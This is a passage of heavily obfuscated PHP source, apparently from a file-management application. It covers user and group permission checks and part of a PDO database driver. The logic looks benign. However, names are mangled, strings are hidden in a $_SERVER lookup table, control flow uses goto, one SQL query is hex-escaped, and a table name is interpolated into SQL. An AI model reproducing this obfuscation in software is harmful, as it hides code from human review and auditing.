$ëÇöòÔ» = Model($êÙ˜Á“å[569])->getInfo($“ï®ô§¸); return array($êÙ˜Á“å[2162] => intval($’‹ÓšÌÅ[$êÙ˜Á“å[470]]), $êÙ˜Á“å[2145] => $’‹ÓšÌÅ, $êÙ˜Á“å[2163] => LNG($êÙ˜Á“å[2164]), $êÙ˜Á“å[2154] => array($êÙ˜Á“å[477] => $ëÇöòÔ»[$êÙ˜Á“å[32]], $êÙ˜Á“å[97] => KodIO::make($ëÇöòÔ»[$êÙ˜Á“å[100]][$êÙ˜Á“å[194]]), $êÙ˜Á“å[2161] => $ëÇöòÔ»[$êÙ˜Á“å[573]])); } protected function groupRootAuth($¡şˆü™õ, $¶Ó¤±è = false) { $ú»úÆí =& $_SERVER[Ñ¯©ç]; $¶Ó¤±è = $¶Ó¤±è ? $¶Ó¤±è : USER_ID; $”ÛÑÏ€ = $¶Ó¤±è . $ú»úÆí[2165] . $¡şˆü™õ; static $® Ù±Ó° = array(); if (isset($® Ù±Ó°[$”ÛÑÏ€])) { return $® Ù±Ó°[$”ÛÑÏ€]; } $ë³Ê¦³® = Model($ú»úÆí[569])->getInfo($¡şˆü™õ); $š¬Í…¼Ù = $this->userGroupList($¶Ó¤±è); $ù²ÒµŒĞ = isset($š¬Í…¼Ù[$¡şˆü™õ]) ? $š¬Í…¼Ù[$¡şˆü™õ][$ú»úÆí[470]] : !1; if ($ù²ÒµŒĞ && Model($ú»úÆí[555])->authCheckAction($ù²ÒµŒĞ[$ú»úÆí[470]], $ú»úÆí[1976])) { $® Ù±Ó°[$”ÛÑÏ€] = $ù²ÒµŒĞ; return $ù²ÒµŒĞ; } $Ã—íá¼ğ = $this->sourceAuthSelect($ë³Ê¦³®[$ú»úÆí[100]][$ú»úÆí[194]]); $ı¾•äİÀ = $Ã—íá¼ğ ? $this->authMake($Ã—íá¼ğ, $¶Ó¤±è) : !1; $‚ç×Šá = $ı¾•äİÀ ? $ı¾•äİÀ[$ú»úÆí[523]] : !1; $® Ù±Ó°[$”ÛÑÏ€] = $‚ç×Šá ? $‚ç×Šá : $ù²ÒµŒĞ; return $® Ù±Ó°[$”ÛÑÏ€]; } public function authOwnerApply($˜©ÊÀÖ) { $…Üìâ›Å =& $_SERVER[Ñ¯©ç]; if (empty($˜©ÊÀÖ[$…Üìâ›Å[470]]) || isset($˜©ÊÀÖ[$…Üìâ›Å[2166]]) && $˜©ÊÀÖ[$…Üìâ›Å[2166]]) { return $˜©ÊÀÖ; } if (AuthModel::authCheckRoot($˜©ÊÀÖ[$…Üìâ›Å[470]][$…Üìâ›Å[471]])) { return $˜©ÊÀÖ; } $‹Ä÷ÉÑ = Model($…Üìâ›Å[1391])->parentLevelArray($˜©ÊÀÖ[$…Üìâ›Å[568]]); $‹Ä÷ÉÑ = array_merge(array($˜©ÊÀÖ[$…Üìâ›Å[194]]), array_reverse($‹Ä÷ÉÑ)); $å°ÈÜŠ– = $this->sourceAuthSelect($‹Ä÷ÉÑ); $Ä„»§Üğ = array(); $Ö§˜¤ƒ = array(); foreach ($å°ÈÜŠ– as $»ù÷³ìó => $ÍŠ²÷’ã) { $¥·§İúŒ = $this->authFolderOwnerUser($ÍŠ²÷’ã); $Ä„»§Üğ[$»ù÷³ìó] = $¥·§İúŒ; $Ö§˜¤ƒ = array_merge($Ö§˜¤ƒ, $¥·§İúŒ[$…Üìâ›Å[645]]); if ($¥·§İúŒ[$…Üìâ›Å[2167]]) { break; } } if (count($Ö§˜¤ƒ) == 0) { $Ö§˜¤ƒ = $this->authFolderOwnerGroup($˜©ÊÀÖ[$…Üìâ›Å[553]]); } $Ö§˜¤ƒ = array_unique($Ö§˜¤ƒ); if (AuthModel::authCheckRoot($˜©ÊÀÖ[$…Üìâ›Å[470]][$…Üìâ›Å[471]])) { $Ö§˜¤ƒ[] = USER_ID; } $˜©ÊÀÖ[$…Üìâ›Å[470]][$…Üìâ›Å[2168]] = Model($…Üìâ›Å[561])->userListInfo($Ö§˜¤ƒ); return $˜©ÊÀÖ; } private function authFolderOwnerGroup($ãêß×Üö) { $–­ÚĞ¤¼ =& $_SERVER[Ñ¯©ç]; $öîÎ—‘« = Model($–­ÚĞ¤¼[2046])->where(array($–­ÚĞ¤¼[1955] => $ãêß×Üö))->select(); $ËØôòÃ¤ = array(); if (!$öîÎ—‘«) { return $ËØôòÃ¤; } foreach ($öîÎ—‘« as $ˆ¦ßˆ›Õ) { $ºõûšËô = $this->authInfo($ˆ¦ßˆ›Õ); if (AuthModel::authCheckRoot($ºõûšËô[$–­ÚĞ¤¼[470]])) { $ËØôòÃ¤[] = $ˆ¦ßˆ›Õ[$–­ÚĞ¤¼[1757]]; } } return $ËØôòÃ¤; } private function authFolderOwnerUser($ª‘²«·í) { $÷÷ºßâé =& $_SERVER[Ñ¯©ç]; $´Õì„¿† = array(); $§®ŒæÆâ = !1; foreach ($ª‘²«·í as $µÔ‘”ı) { $»‡à´‘ç = $this->authInfo($µÔ‘”ı); if ($µÔ‘”ı[$÷÷ºßâé[553]] == $÷÷ºßâé[229]) { $§®ŒæÆâ = !0; } if ($µÔ‘”ı[$÷÷ºßâé[191]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($»‡à´‘ç[$÷÷ºßâé[470]])) { $´Õì„¿†[] = $µÔ‘”ı[$÷÷ºßâé[553]]; } } } return array($÷÷ºßâé[645] => $´Õì„¿†, $÷÷ºßâé[2167] => $§®ŒæÆâ); } public function authMake($Æ´½Å, $¯„İ¹Œ = false) { $—ôÛ´â =& $_SERVER[Ñ¯©ç]; $Şô¥·äÄ = $this->authArrayCheck($Æ´½Å, $¯„İ¹Œ); if ($Şô¥·äÄ[$—ôÛ´â[2169]]) { $Şô¥·äÄ[$—ôÛ´â[2169]] = $this->sourceAuthInfo($Şô¥·äÄ[$—ôÛ´â[2169]]); } return $Şô¥·äÄ; } public function authArrayCheck($ÏØ‹Ï‰¼, $ØçÂŸ–û = false) { $äÁ«û–· =& $_SERVER[Ñ¯©ç]; if (!$ÏØ‹Ï‰¼) { return array($äÁ«û–·[471] => 0, $äÁ«û–·[523] => !1); } $ØçÂŸ–û = $ØçÂŸ–û ? $ØçÂŸ–û : USER_ID; $ä¢ŠƒËú = 0; $ãÔÀ¼Øˆ = 0; $íà©ì¾ = 0; $à³È×Ñ = 0; $ÕĞ³ğÔØ = 0; $ùùİñê = 0; $«Œ’«” = 1000; $Êæ˜¨ = 0; $µÄ§ÀÏ” = 0; $Ìê¡ú‘ = 0; $ÏıŸ–Ö = 0; $Â‡Ãº¸Í = array($äÁ«û–·[194] => 0); foreach ($ÏØ‹Ï‰¼ as $Â‡Ãº¸Í) { $²Áååı† = $this->authInfo($Â‡Ãº¸Í); if (!$²Áååı†) { continue; } $¸°öÔõ = $Â‡Ãº¸Í[$äÁ«û–·[553]]; $†Â´—Ğì = intval($²Áååı†[$äÁ«û–·[470]]); if ($Â‡Ãº¸Í[$äÁ«û–·[191]] == SourceModel::TYPE_USER && $¸°öÔõ == $ØçÂŸ–û) { $ä¢ŠƒËú = !0; $íà©ì¾ = $²Áååı†; $ãÔÀ¼Øˆ = $†Â´—Ğì; } else { if ($Â‡Ãº¸Í[$äÁ«û–·[191]] == SourceModel::TYPE_GROUP && $this->groupContainUser($¸°öÔõ, $ØçÂŸ–û)) { $à³È×Ñ = !0; $‡½ÁŒÅ = $this->groupStepToUserGroup($¸°öÔõ, $ØçÂŸ–û); if ($‡½ÁŒÅ < $«Œ’«”) { $«Œ’«” = $‡½ÁŒÅ; $ÕĞ³ğÔØ = $†Â´—Ğì; $ùùİñê = $²Áååı†; $Êæ˜¨ = $¸°öÔõ; } if ($‡½ÁŒÅ == $«Œ’«” && $†Â´—Ğì >= $ÕĞ³ğÔØ) { $ÕĞ³ğÔØ = $†Â´—Ğì; $ùùİñê = $²Áååı†; $Êæ˜¨ = $¸°öÔõ; } } else { if ($¸°öÔõ == $äÁ«û–·[229]) { $µÄ§ÀÏ” = !0; $ÏıŸ–Ö = $²Áååı†; $Ìê¡ú‘ = $†Â´—Ğì; } } } } if ($ä¢ŠƒËú) { $ˆ‘—áú‚ = $ãÔÀ¼Øˆ; $²Áååı† = $íà©ì¾; $ïè—ÌÊå = LNG($äÁ«û–·[2170]); } else { if ($à³È×Ñ) { $ˆ‘—áú‚ = $ÕĞ³ğÔØ; $²Áååı† = $ùùİñê; $ñ’ı«ÍÚ = Model($äÁ«û–·[569])->getInfo($Êæ˜¨); $ïè—ÌÊå = $äÁ«û–·[176] . $ñ’ı«ÍÚ[$äÁ«û–·[573]] . $äÁ«û–·[2171] . LNG($äÁ«û–·[2172]); } else { if ($µÄ§ÀÏ”) { $ˆ‘—áú‚ = $Ìê¡ú‘; $²Áååı† = $ÏıŸ–Ö; $ïè—ÌÊå = LNG($äÁ«û–·[2142]); } else { $ˆ‘—áú‚ = 0; $²Áååı† = !1; $ïè—ÌÊå = $äÁ«û–·[12]; } } } $î‰ºÛØ = array($äÁ«û–·[2162] => intval($ˆ‘—áú‚), $äÁ«û–·[2145] => $²Áååı†, $äÁ«û–·[2163] => $ïè—ÌÊå, $äÁ«û–·[2154] => $Â‡Ãº¸Í[$äÁ«û–·[194]]); return $î‰ºÛØ; } private function groupContainUser($ÓáºäŒ, $ä¤İˆë± = false) { return in_array($ÓáºäŒ, $this->userGroupParents($ä¤İˆë±)); } private function groupStepToUserGroup($Ğ”ÌÈ©ü, $Õœ»õî = false) { $¿Ÿ›—­ =& $_SERVER[Ñ¯©ç]; $¬Ö…ºµ = $this->userGroupList($Õœ»õî); $äŠ‚€™Ô = 1000; $é¿õíÚ« = $GLOBALS[$¿Ÿ›—­[6]][$¿Ÿ›—­[102]][$¿Ÿ›—­[2059]] == 1; $Ñ’’Õ„ = $é¿õíÚ« ? 3 : 2; foreach ($¬Ö…ºµ as $şûàÀ”û) { if ($şûàÀ”û[$¿Ÿ›—­[1955]] == $Ğ”ÌÈ©ü) { return 0; } $Ş–ÊÖ—Ô = explode($¿Ÿ›—­[50], trim($şûàÀ”û[$¿Ÿ›—­[568]], $¿Ÿ›—­[50])); if ($Ş–ÊÖ—Ô[0] == $¿Ÿ›—­[229] && count($Ş–ÊÖ—Ô) > $Ñ’’Õ„) { $–—ÑÜ” = array_reverse(array_slice($Ş–ÊÖ—Ô, $Ñ’’Õ„)); $ˆÕğÛ¢ = array_search($Ğ”ÌÈ©ü, $–—ÑÜ”); if ($ˆÕğÛ¢ !== !1 && $ˆÕğÛ¢ + 1 <= $äŠ‚€™Ô) { $äŠ‚€™Ô = $ˆÕğÛ¢ + 1; } } } return $äŠ‚€™Ô; } private function userGroupList($ŞŞ¾‘Ô = false) { $»£¯·í =& $_SERVER[Ñ¯©ç]; static $´êğş… = array(); if (isset($´êğş…[$ŞŞ¾‘Ô])) { return $´êğş…[$ŞŞ¾‘Ô]; } $´—ß†Š£ = Model($»£¯·í[582])->getInfo($ŞŞ¾‘Ô); $´êğş…[$ŞŞ¾‘Ô] = array_to_keyvalue($´—ß†Š£[$»£¯·í[2143]], $»£¯·í[1955]); return $´êğş…[$ŞŞ¾‘Ô]; } public function userGroupParents($ƒŞ÷©Š) { $âö¡Â‚˜ =& $_SERVER[Ñ¯©ç]; static $êõªÃÀ­ = array(); $ƒŞ÷©Š = $ƒŞ÷©Š ? $ƒŞ÷©Š : USER_ID; if (isset($êõªÃÀ­[$ƒŞ÷©Š])) { return $êõªÃÀ­[$ƒŞ÷©Š]; } $¤™ÎÈ¶“ = $this->userGroupList($ƒŞ÷©Š); $ø—‘Àş = array(); $Ûƒï·öœ = $GLOBALS[$âö¡Â‚˜[6]][$âö¡Â‚˜[102]][$âö¡Â‚˜[2059]] == 1; $óÁíÔâÀ = $Ûƒï·öœ ? 3 : 2; foreach ($¤™ÎÈ¶“ as $ôÆôÄ) { $ûŒÛïı¶ = array($ôÆôÄ[$âö¡Â‚˜[1955]]); $…×æÛ â = explode($âö¡Â‚˜[50], trim($ôÆôÄ[$âö¡Â‚˜[568]], $âö¡Â‚˜[50])); if ($…×æÛ â[0] == $âö¡Â‚˜[229] && count($…×æÛ â) > $óÁíÔâÀ) { $«¸óÃ¼ = array_slice($…×æÛ â, $óÁíÔâÀ); $ûŒÛïı¶ = array_merge($ûŒÛïı¶, array_reverse($«¸óÃ¼)); } $ø—‘Àş = array_merge($ø—‘Àş, $ûŒÛïı¶); } $êõªÃÀ­[$ƒŞ÷©Š] = array_unique($ø—‘Àş); return $êõªÃÀ­[$ƒŞ÷©Š]; } public function authTargetInfoMake($•ƒÈøè“) { $²À¤¿ÀÓ =& $_SERVER[Ñ¯©ç]; $ôø£óµ = array(); $Âíé®çê = array(); foreach ($•ƒÈøè“ as $Üšğ«‹Ò) { if ($Üšğ«‹Ò[$²À¤¿ÀÓ[191]] == SourceModel::TYPE_USER) { $ôø£óµ[] = intval($Üšğ«‹Ò[$²À¤¿ÀÓ[553]]); } else { if ($Üšğ«‹Ò[$²À¤¿ÀÓ[191]] == SourceModel::TYPE_GROUP) { $Âíé®çê[] = intval($Üšğ«‹Ò[$²À¤¿ÀÓ[553]]); } } } if ($ôø£óµ) { $ôø£óµ = Model($²À¤¿ÀÓ[561])->userListInfo($ôø£óµ); } if ($Âíé®çê) { $ä“£—‡ß = array($²À¤¿ÀÓ[2044] => array($²À¤¿ÀÓ[475], $Âíé®çê)); $Âíé®çê = Model($²À¤¿ÀÓ[569])->field($²À¤¿ÀÓ[2173])->where($ä“£—‡ß)->select(); $Âíé®çê = array_to_keyvalue($Âíé®çê, $²À¤¿ÀÓ[1955]); } return array($²À¤¿ÀÓ[2174] => $ôø£óµ, $²À¤¿ÀÓ[2175] => $Âíé®çê); } public function authInfo($É•ÌÎ“´) { $İ”¤²¼¨ =& $_SERVER[Ñ¯©ç]; if ($É•ÌÎ“´[$İ”¤²¼¨[2060]]) { $É¾ñŠ§ = Model($İ”¤²¼¨[555])->listData($É•ÌÎ“´[$İ”¤²¼¨[2060]]); if (!$É¾ñŠ§) { return !1; $’ºï™Î† = Model($İ”¤²¼¨[555])->listData(); $‹É  ¢ = array_filter_by_field($’ºï™Î†, $İ”¤²¼¨[470], $İ”¤²¼¨[229]); return $‹É  ¢; } $òœµ¼Ì = array_field_key($É¾ñŠ§, array($İ”¤²¼¨[458], $İ”¤²¼¨[32], $İ”¤²¼¨[470], $İ”¤²¼¨[1978], $İ”¤²¼¨[1979])); $òœµ¼Ì[$İ”¤²¼¨[2176]] = $É•ÌÎ“´; return $òœµ¼Ì; } else { return array($İ”¤²¼¨[476] => 0, $İ”¤²¼¨[1961] => $É•ÌÎ“´[$İ”¤²¼¨[2120]], $İ”¤²¼¨[477] => $İ”¤²¼¨[12], $İ”¤²¼¨[1978] => $İ”¤²¼¨[2177]); } } } goto fö„›é˜æ’; D…ìÌ³½óø: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($µĞ€£Ú£ = '') { $¿¼°Ó¯² =& $_SERVER[Ñ¯©ç]; if (!class_exists($¿¼°Ó¯²[967])) { think_exception(think_lang($¿¼°Ó¯²[14]) . $¿¼°Ó¯²[968]); } if (!empty($µĞ€£Ú£)) { $this->config = $µĞ€£Ú£; if (empty($this->config[$¿¼°Ó¯²[17]])) { $this->config[$¿¼°Ó¯²[17]] = array(); } } } public function connect($ıÄÔÊ˜• = '', $àÉ¢«İÇ = 0) { $’Îâîİë =& $_SERVER[Ñ¯©ç]; if (!isset($this->linkID[$àÉ¢«İÇ])) { if (empty($ıÄÔÊ˜•)) { $ıÄÔÊ˜• = $this->config; } $ƒëì” = !empty($ıÄÔÊ˜•[$’Îâîİë[17]][$’Îâîİë[18]]) ? $ıÄÔÊ˜•[$’Îâîİë[17]][$’Îâîİë[18]] : $this->pconnect; if ($ƒëì”) { $ıÄÔÊ˜•[$’Îâîİë[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$àÉ¢«İÇ] = new PDO($ıÄÔÊ˜•[$’Îâîİë[969]], $ıÄÔÊ˜•[$’Îâîİë[941]], $ıÄÔÊ˜•[$’Îâîİë[942]], $ıÄÔÊ˜•[$’Îâîİë[17]]); } catch (PDOException $ÜÍ‘ÂÁ) { think_exception($ÜÍ‘ÂÁ->getMessage()); } $this->dbType = $this->_getDsnType($ıÄÔÊ˜•[$’Îâîİë[969]]); if (in_array($this->dbType, array($’Îâîİë[970], $’Îâîİë[971], $’Îâîİë[972], $’Îâîİë[973]))) { think_exception($’Îâîİë[974] . $this->dbType . $’Îâîİë[975] . $this->dbType . $’Îâîİë[976]); } if (!$this->linkID[$àÉ¢«İÇ]) { think_exception($’Îâîİë[977]); } try { $this->linkID[$àÉ¢«İÇ]->exec($’Îâîİë[978] . think_config($’Îâîİë[944])); } catch (Exception $ÜÍ‘ÂÁ) { } $this->connected = !0; if (1 != think_config($’Îâîİë[22])) { unset($this->config); } } return $this->linkID[$àÉ¢«İÇ]; } public function free() { $this->PDOStatement = null; } public function query($ıÔíôÙâ, $›ŠäÓœ˜ = array()) { $â–í¶Úî =& $_SERVER[Ñ¯©ç]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ıÔíôÙâ; if (!empty($›ŠäÓœ˜)) { $this->queryStr .= $â–í¶Úî[979] . print_r($›ŠäÓœ˜, !0) . $â–í¶Úî[980]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($â–í¶Úî[23], 1); think_status($â–í¶Úî[24]); $this->PDOStatement = $this->_linkID->prepare($ıÔíôÙâ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $õı¤ôèŠ = $this->PDOStatement->execute($›ŠäÓœ˜); $this->debug(); if (!1 === $õı¤ôèŠ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($Ëâ¼Å•œ, $¾ñİÃ¥Î = array()) { $Ù›Ëˆ¨¤ =& $_SERVER[Ñ¯©ç]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ëâ¼Å•œ; if (!empty($¾ñİÃ¥Î)) { $this->queryStr .= $Ù›Ëˆ¨¤[979] . print_r($¾ñİÃ¥Î, !0) . $Ù›Ëˆ¨¤[980]; } $­œı‹¾— = !1; if ($this->dbType == $Ù›Ëˆ¨¤[973]) { if (preg_match($Ù›Ëˆ¨¤[981], $this->queryStr, $«“§‡îÈ)) { $this->table = think_config($Ù›Ëˆ¨¤[982]) . str_ireplace(think_config($Ù›Ëˆ¨¤[983]), $Ù›Ëˆ¨¤[63], $«“§‡îÈ[2]); $­œı‹¾— = (bool) $this->query($Ù›Ëˆ¨¤[984] . strtoupper($this->table) . $Ù›Ëˆ¨¤[68]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Ù›Ëˆ¨¤[25], 1); think_status($Ù›Ëˆ¨¤[24]); $this->PDOStatement = $this->_linkID->prepare($Ëâ¼Å•œ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ ¦óÊÓñ = $this->PDOStatement->execute($¾ñİÃ¥Î); $this->debug(); if (!1 === $ ¦óÊÓñ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($­œı‹¾— || preg_match($Ù›Ëˆ¨¤[985], $Ëâ¼Å•œ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $°©ÅÁÑÁ = $this->_linkID->commit(); $this->transTimes = 0; if (!$°©ÅÁÑÁ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¹ÖÂüÌÃ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$¹ÖÂüÌÃ) { $this->error(); return !1; } } return !0; } private function getAll() { $÷©Ï˜ş´ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($÷©Ï˜ş´); return $÷©Ï˜ş´; } public function getFields($˜§ù´ä) { $‚¦˜§¼– =& $_SERVER[Ñ¯©ç]; $this->initConnect(!0); if (think_config($‚¦˜§¼–[986])) { $ÚÁ­¹¶Ù = str_replace($‚¦˜§¼–[987], $˜§ù´ä, think_config($‚¦˜§¼–[986])); } else { switch ($this->dbType) { case $‚¦˜§¼–[970]: case $‚¦˜§¼–[988]: $ÚÁ­¹¶Ù = "\123\105\114\105\x43\x54\x20\40\x20\143\157\154\x75\x6d\x6e\137\x6e\141\x6d\x65\x20\141\163\x20\47\x4e\x61\x6d\145\x27\x2c\x20\x20\x20\144\x61\x74\141\x5f\x74\171\160\x65\x20\141\x73\40\x27\x54\x79\160\145\47\54\40\40\x20\143\157\154\x75\155\156\x5f\x64\145\x66\x61\165\x6c\x74\40\141\x73\40\x27\x44\145\x66\141\165\154\x74\x27\54\x20\x20\40\151\163\x5f\x6e\165\x6c\x6c\x61\142\x6c\145\x20\x61\x73\40\x27\116\x75\154\x6c\47\12\x9\x9\106\x52\x4f\115\11\151\156\146\157\162\155\141\164\x69\x6f\x6e\x5f\163\143\x68\145\155\x61\56\x74\x61\x62\154\145\163\40\101\123\40\164\xa\x9\x9\x4a\117\x49\116\x9\151\156\146\x6f\162\x6d\x61\x74\x69\157\x6e\x5f\x73\143\x68\145\x6d\141\x2e\x63\157\154\165\155\x6e\163\40\101\x53\x20\143\12\11\11\x4f\116\x20\40\x74\56\x74\141\x62\x6c\x65\x5f\143\x61\x74\x61\x6c\x6f\147\x20\75\40\143\56\x74\x61\142\x6c\145\x5f\x63\x61\164\x61\154\x6f\x67\xa\11\x9\x41\x4e\x44\x20\164\x2e\164\x61\x62\x6c\x65\137\x73\x63\150\x65\x6d\141\x20\75\40\143\x2e\164\x61\142\x6c\x65\x5f\x73\143\150\x65\155\141\12\x9\x9\x41\x4e\x44\x20\164\56\x74\x61\142\154\145\x5f\x6e\x61\x6d\145\x20\75\40\x63\x2e\x74\141\x62\x6c\145\137\156\141\x6d\145\xa\x9\11\x57\x48\105\122\x45\x20\x20\40\164\56\x74\141\x62\154\145\137\156\x61\155\x65\40\x3d\40\47{$˜§ù´ä}\x27"; break; case $‚¦˜§¼–[989]: $ÚÁ­¹¶Ù = $‚¦˜§¼–[990] . $˜§ù´ä . $‚¦˜§¼–[991]; break; case $‚¦˜§¼–[971]: case $‚¦˜§¼–[973]: $ÚÁ­¹¶Ù = $‚¦˜§¼–[992] . $‚¦˜§¼–[993] . $‚¦˜§¼–[994] . strtoupper($˜§ù´ä) . $‚¦˜§¼–[995] . strtoupper($˜§ù´ä) . $‚¦˜§¼–[996]; break; case $‚¦˜§¼–[997]: $ÚÁ­¹¶Ù = $‚¦˜§¼–[998] . $˜§ù´ä . $‚¦˜§¼–[999]; break; case $‚¦˜§¼–[972]: break; case $‚¦˜§¼–[1000]: default: $ÚÁ­¹¶Ù = $‚¦˜§¼–[1001] . ($this->dbType == $‚¦˜§¼–[1000] ? "\140{$˜§ù´ä}\140" : $˜§ù´ä); } } $ª»õİü¢ = $this->query($ÚÁ­¹¶Ù); $èŒ—Å” = array(); if ($ª»õİü¢) { foreach ($ª»õİü¢ as $ıœµÃÀà => $€‘«“É—) { $€‘«“É— = array_change_key_case($€‘«“É—); $€‘«“É—[$‚¦˜§¼–[32]] = isset($€‘«“É—[$‚¦˜§¼–[32]]) ? $€‘«“É—[$‚¦˜§¼–[32]] : $‚¦˜§¼–[63]; $€‘«“É—[$‚¦˜§¼–[33]] = isset($€‘«“É—[$‚¦˜§¼–[33]]) ? $€‘«“É—[$‚¦˜§¼–[33]] : $‚¦˜§¼–[63]; $ÓÊ¬™ò– = isset($€‘«“É—[$‚¦˜§¼–[334]]) ? $€‘«“É—[$‚¦˜§¼–[334]] : $€‘«“É—[$‚¦˜§¼–[32]]; $èŒ—Å”[$ÓÊ¬™ò–] = array($‚¦˜§¼–[32] => $ÓÊ¬™ò–, $‚¦˜§¼–[33] => $€‘«“É—[$‚¦˜§¼–[33]], $‚¦˜§¼–[35] => (bool) (isset($€‘«“É—[$‚¦˜§¼–[116]]) && $€‘«“É—[$‚¦˜§¼–[116]] === $‚¦˜§¼–[12] || isset($€‘«“É—[$‚¦˜§¼–[35]]) && $€‘«“É—[$‚¦˜§¼–[35]] === $‚¦˜§¼–[12]), $‚¦˜§¼–[37] => isset($€‘«“É—[$‚¦˜§¼–[37]]) ? $€‘«“É—[$‚¦˜§¼–[37]] : (isset($€‘«“É—[$‚¦˜§¼–[66]]) ? $€‘«“É—[$‚¦˜§¼–[66]] : $‚¦˜§¼–[63]), $‚¦˜§¼–[39] => isset($€‘«“É—[$‚¦˜§¼–[107]]) ? strtolower($€‘«“É—[$‚¦˜§¼–[107]]) == $‚¦˜§¼–[41] : (isset($€‘«“É—[$‚¦˜§¼–[67]]) ? $€‘«“É—[$‚¦˜§¼–[67]] : !1), $‚¦˜§¼–[42] => isset($€‘«“É—[$‚¦˜§¼–[1002]]) ? strtolower($€‘«“É—[$‚¦˜§¼–[1002]]) == $‚¦˜§¼–[44] : (isset($€‘«“É—[$‚¦˜§¼–[107]]) ? $€‘«“É—[$‚¦˜§¼–[107]] : !1)); } } return $èŒ—Å”; } public function getTables($»ÉÇÔı¸ = '') { $¢¸Ë—„ =& $_SERVER[Ñ¯©ç]; if (think_config($¢¸Ë—„[1003])) { $—öÉ£ß = str_replace($¢¸Ë—„[1004], $»ÉÇÔı¸, think_config($¢¸Ë—„[1003])); } else { switch ($this->dbType) { case $¢¸Ë—„[971]: case $¢¸Ë—„[973]: $—öÉ£ß = $¢¸Ë—„[1005]; break; case $¢¸Ë—„[970]: case $¢¸Ë—„[988]: $—öÉ£ß = $¢¸Ë—„[1006]; break; case $¢¸Ë—„[997]: $—öÉ£ß = $¢¸Ë—„[1007]; break; case $¢¸Ë—„[972]: think_exception(think_lang($¢¸Ë—„[1008]) . $¢¸Ë—„[1009]); break; case $¢¸Ë—„[989]: $—öÉ£ß = $¢¸Ë—„[45] . $¢¸Ë—„[46] . $¢¸Ë—„[47]; break; case $¢¸Ë—„[1000]: default: if (!empty($»ÉÇÔı¸)) { $—öÉ£ß = $¢¸Ë—„[952] . $»ÉÇÔı¸ . $¢¸Ë—„[953]; } else { $—öÉ£ß = $¢¸Ë—„[954]; } } } $µû›ú¸ = $this->query($—öÉ£ß); $‘¼‹€Ï = array(); foreach ($µû›ú¸ as $°à›Üš => $€á¶‡–ğ) { $‘¼‹€Ï[$°à›Üš] = current($€á¶‡–ğ); } return $‘¼‹€Ï; } protected function parseLimit($õŒš¦») { $Ë¼·³«· =& $_SERVER[Ñ¯©ç]; $Ëª‹µì˜ = $Ë¼·³«·[12]; if (!empty($õŒš¦»)) { switch ($this->dbType) { case $Ë¼·³«·[997]: case $Ë¼·³«·[989]: $õŒš¦» = explode($Ë¼·³«·[50], $õŒš¦»); if (count($õŒš¦») > 1) { $Ëª‹µì˜ .= $Ë¼·³«·[51] . $õŒš¦»[1] . $Ë¼·³«·[52] . $õŒš¦»[0] . $Ë¼·³«·[53]; } else { $Ëª‹µì˜ .= $Ë¼·³«·[51] . $õŒš¦»[0] . $Ë¼·³«·[53]; } break; case $Ë¼·³«·[970]: case $Ë¼·³«·[988]: break; case $Ë¼·³«·[972]: break; case $Ë¼·³«·[971]: case $Ë¼·³«·[973]: break; case $Ë¼·³«·[1000]: default: $Ëª‹µì˜ .= $Ë¼·³«·[51] . $õŒš¦» . $Ë¼·³«·[53]; } } return $Ëª‹µì˜; } public function parseKey(&$¼Ï½–œê, $Õå™ğ¾ = true) { $ñ¿…ÈâŠ =& $_SERVER[Ñ¯©ç]; if ($Õå™ğ¾) { $¼Ï½–œê = $this->parseKeyCheck($¼Ï½–œê); } if ($this->dbType == $ñ¿…ÈâŠ[1000]) { if ($¼Ï½–œê != $ñ¿…ÈâŠ[221] && !preg_match($ñ¿…ÈâŠ[964], $¼Ï½–œê)) { $¼Ï½–œê = $ñ¿…ÈâŠ[444] . trim($¼Ï½–œê, $ñ¿…ÈâŠ[444]) . $ñ¿…ÈâŠ[444]; } return $¼Ï½–œê; } else { return parent::parseKey($¼Ï½–œê, $Õå™ğ¾); } } public function close() { $this->_linkID = null; } public function error() { $´—µªåñ =& $_SERVER[Ñ¯©ç]; if ($this->PDOStatement) { $Åù§Î‡ˆ = $this->PDOStatement->errorInfo(); $this->error = $Åù§Î‡ˆ[1] . $´—µªåñ[4] . $Åù§Î‡ˆ[2]; } else { $this->error = $´—µªåñ[12]; } if ($´—µªåñ[12] != $this->queryStr) { $this->error .= LNG($´—µªåñ[48]) . $this->queryStr; } think_trace($this->error, $´—µªåñ[12], $´—µªåñ[49]); return $this->error; } public function escapeString($÷æ†Ëï) { $×¡Âóú— =& $_SERVER[Ñ¯©ç]; switch ($this->dbType) { case $×¡Âóú—[997]: case $×¡Âóú—[970]: case $×¡Âóú—[988]: case $×¡Âóú—[1000]: return addslashes($÷æ†Ëï); case $×¡Âóú—[972]: case $×¡Âóú—[989]: case $×¡Âóú—[971]: case $×¡Âóú—[973]: return str_ireplace($×¡Âóú—[68], $×¡Âóú—[69], $÷æ†Ëï); } } protected function parseValue($‘ş®ºæ) { $÷Ğ˜ŞÚ¨ =& $_SERVER[Ñ¯©ç]; if (is_string($‘ş®ºæ)) { $Â´ûøã˜ = strpos($‘ş®ºæ, $÷Ğ˜ŞÚ¨[4]) === 0 && in_array($‘ş®ºæ, array_keys($this->bind)); $‘ş®ºæ = $Â´ûøã˜ ? $this->escapeString($‘ş®ºæ) : $÷Ğ˜ŞÚ¨[1010] . $this->escapeString($‘ş®ºæ) . $÷Ğ˜ŞÚ¨[1010]; } elseif (isset($‘ş®ºæ[0]) && is_string($‘ş®ºæ[0]) && strtolower($‘ş®ºæ[0]) == 